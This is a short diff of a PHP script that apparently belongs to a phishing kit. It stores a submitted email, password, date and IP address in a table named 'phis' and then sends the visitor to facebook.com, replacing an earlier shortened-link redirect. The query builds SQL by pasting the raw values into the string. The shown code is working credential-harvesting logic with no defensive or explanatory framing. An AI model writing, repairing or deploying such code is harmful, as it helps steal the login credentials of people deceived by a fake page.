@@ -13,7 +13,7 @@ if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
 $time = date("Y-m-d",$t);
 $query = "INSERT INTO `phis`(`Email`, `Password`, `Time`,`IP`) VALUES ('$email','$password','$time','$ip_address')";
 $link->query($query);
-header ('Location:http://ow.ly/ZIu2P');
+header ('Location:https://facebook.com');
 exit;
 
 ?>
